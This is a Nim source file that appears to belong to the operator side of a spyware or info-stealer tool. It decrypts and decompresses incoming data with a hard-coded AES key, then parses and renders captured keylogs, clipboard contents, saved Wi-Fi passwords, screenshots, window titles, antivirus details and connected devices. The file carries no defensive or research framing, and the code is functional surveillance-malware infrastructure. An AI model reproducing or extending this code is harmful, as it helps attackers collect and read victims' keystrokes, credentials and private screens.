import aes
import ../more/zlibstatic/src/zlibstatic/zlib
from ../flags import AES_ENCRYPT_KEY

from std/sha1 import secureHash
from std/sha1 import `$`

from strutils import split

import ../components/headerCard
import ../components/windowName
import ../components/clipboard
import ../components/keylog
import ../components/keyboardLocale
import ../components/av
import ../components/connectedWifi
import ../components/wifiPassword
import ../components/screenshot
import ../components/connectedDevices

proc parseThreads*(id: string, data: string): string =
  for thread in data.split("."):
    if thread == "":
      continue
    let threadSplit: seq[string] = thread.split(",")
    let threadName: string = threadSplit[0]
    let threadData: string = threadSplit[1]

    echo threadName
    ## current threads
    ## c
    ## cd
    ## cw
    ## av
    ## kl
    ## k
    ## ss
    ## wp
    ## wn
    ## sd
    case threadName
    of "h":
      result = headerCard.render(id, threadData.split(";"))
    of "wn":
      result.add windowName.render threadData.split(";")
    of "k":
      result.add keylog.render(threadData.split(";"))
    of "kl":
      for data in threadData.split(";"):
        if data == "":
          continue

        result.add keyboardLocale.render data
    of "c":
      result.add clipboard.render threadData.split(";")
    of "cd":
      result.add connectedDevices.render threadData.split(";")
    of "av":
      result.add av.render threadData.split(";")
    of "wp":
      result.add wifiPassword.render threadData.split(";")
    of "cw":
      for data in threadData.split(";"):
        if data == "":
          continue

        result.add connectedWifi.render data
    of "ss":
      for data in threadData.split(";"):
        if data == "":
          continue

        result.add screenshot.render data

proc decryptData*(data: string): string =
  result = uncompress(decrypt data, stream = RAW_DEFLATE)

proc initHeaderKey*(headerContent: string): void =
  config.key = $secureHash headerContent & AES_ENCRYPT_KEY & config.aad & config.iv

proc clearHeaderKey*(): void =
  config.key = AES_ENCRYPT_KEY
